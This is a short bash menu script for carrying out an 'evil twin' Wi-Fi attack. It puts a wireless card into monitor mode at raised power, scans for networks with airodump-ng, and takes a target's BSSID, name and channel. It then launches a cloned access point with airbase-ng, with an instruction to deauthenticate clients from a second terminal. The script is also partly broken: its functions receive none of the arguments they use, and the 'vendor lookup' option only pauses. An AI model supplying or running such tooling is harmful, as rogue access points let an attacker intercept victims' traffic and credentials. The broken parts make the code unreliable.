#!/bin/bash
source /root/Desktop/Bash_Scripts/sources/Variables.sh
# function to display menu
Show_Main_Menu() {
	echo -e "${BOLD}${BLUE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e " EVIL TWIN ATTACK"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${STD}"
  echo "1. Scan for networks."
	echo "2. Insert BSSID, name and channel to use."
	echo "3. Create Access Point."
  echo "4. Lookup Mac Addresses Of Vendors."
	echo "5. Exit"
}

Read_Options() {
	local choice
	echo -e "${BOLD}${ORANGE}Enter choice [1 - 5]${STD}"
  read choice
	case $choice in
    1) Monitor ; Scan ; Managed ;;
		2) Define_Variables ;;
		3) CreateAP ;;
		4) Pause ;;
    5) exit 0;;
		*) echo -e "${BOLD}${LIGHTRED}Error...${STD}" && sleep 1 && clear
	esac
}

function Define_Variables() {
  echo "MAC:"
  read mac
  echo "Name:"
  read name
  echo "channel:"
  read channel
}

# $1 : network interface
function Monitor() {
  iwconfig wlan0 txpower 30
	airmon-ng check kill
	airmon-ng start $1
}
# $1 : network inteface in monitor mode
function Scan() {
  echo -e "${BOLD}${ORANGE}Scanning, use CTRL + C to stop.${STD}"
  airodump-ng $1
  Pause
}
# $1 : network interface to put back in managed mode
function Managed() {
  airmon-ng stop $1
	service network-manager start
}
# $1: AP Mac | $2: AP Name | $3: Channel | $4: network interface (monitor mode)
function CreateAP() {
  echo -e "${BOLD}${ORANGE}Open a second terminal and perform a deauthentication attack.${STD}"
  airbase-ng -a $1 --essid "$2" -c $3 $4
}

Pause() {
  echo -e "${BOLD}${ORANGE}Press [Enter] key to continue...${STD}"
  read fackEnterKey
}
